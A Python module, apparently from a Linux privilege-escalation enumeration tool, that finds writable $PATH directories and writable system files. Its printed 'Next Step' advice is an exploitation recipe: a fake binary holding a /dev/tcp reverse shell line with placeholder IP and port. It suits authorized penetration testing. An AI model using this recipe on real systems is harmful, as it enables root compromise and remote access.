from core import vectors
import os
from core.utils import run_command, file_exists, is_writable
from core.printer import (
    print_section, print_critical, print_high,
    print_not_found
)

VECTOR_NAME = vectors.WRITABLE_PATHS


def run() -> list:
    print_section(VECTOR_NAME)
    results = []

    results += _check_path_dirs()
    results += _check_world_writable_files()

    if not results:
        print_not_found("Writable Paths", {
            "Checked": "$PATH directories and sensitive system files",
            "Result" : "No dangerous writable paths found"
        })
        return [{"vector": vectors.WRITABLE_PATHS, "severity": "CLEAN", "count": 0}]

    return results


# ─────────────────────────────────────────────
# $PATH Writable Directories
# ─────────────────────────────────────────────

def _check_path_dirs() -> list:
    path_env  = os.environ.get("PATH", "")

    # Duplicates remove karo, order preserve karo
    path_dirs = list(dict.fromkeys(
        p.strip() for p in path_env.split(os.pathsep)
        if p.strip()
    ))

    # Sirf Linux paths check karo
    writable_dirs = []
    for d in path_dirs:
        if not d.startswith("/"):
            continue
        if os.path.isdir(d) and is_writable(d):
            writable_dirs.append(d)

    if not writable_dirs:
        return []

    print_critical("Writable Directory Found in $PATH", {
        "Directories": writable_dirs,
        "Risk"       : "Can place malicious binary with same name as root-called command",
        "Next Step"  : [
            "Find commands called by root scripts:",
            "grep -r '<command_name>' /etc/cron*",
            "Create fake binary in writable dir:",
            "echo '#!/bin/bash' > /writable/dir/<command>",
            "echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> /writable/dir/<command>",
            "chmod +x /writable/dir/<command>"
        ],
        "Reference"  : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path"
    })
    return [{"vector": "Writable $PATH Dir", "severity": "CRITICAL", "count": len(writable_dirs)}]


# ─────────────────────────────────────────────
# World Writable Files in System Dirs
# ─────────────────────────────────────────────

def _check_world_writable_files() -> list:
    raw = run_command(
        "find /etc /usr /bin /sbin -type f -writable 2>/dev/null"
    )
    files = [f.strip() for f in raw.splitlines() if f.strip()]

    if not files:
        return []

    print_high("Writable Files in System Directories", {
        "Files"    : files,
        "Risk"     : "System files modifiable by current user — possible persistence or privesc",
        "Next Step": "Check each file — is it called by root? Can it be replaced?",
        "Reference": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"
    })
    return [{"vector": "Writable System Files", "severity": "HIGH", "count": len(files)}]